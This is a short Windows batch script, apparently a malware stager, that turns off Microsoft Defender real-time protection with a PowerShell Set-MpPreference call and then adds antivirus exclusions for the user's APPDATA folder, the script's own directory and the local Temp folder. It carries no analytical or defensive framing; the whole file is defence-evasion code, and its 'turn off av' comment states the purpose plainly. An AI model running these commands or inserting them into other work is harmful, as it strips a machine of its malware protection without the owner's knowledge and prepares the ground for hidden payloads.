@echo off
:: Get APPDATA path and current script directory
set "appdataPath=%APPDATA%"
set "scriptDir=%~dp0"
set "scriptDir=%scriptDir:~0,-1%"  :: Remove trailing backslash

:: turn off av
PowerShell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"

:: Add exclusions using PowerShell
powershell -Command "Add-MpPreference -ExclusionPath '%appdataPath%'"
powershell -Command "Add-MpPreference -ExclusionPath '%scriptDir%'"
powershell -Command "Add-MpPreference -ExclusionPath '%LOCALAPPDATA%\Temp'"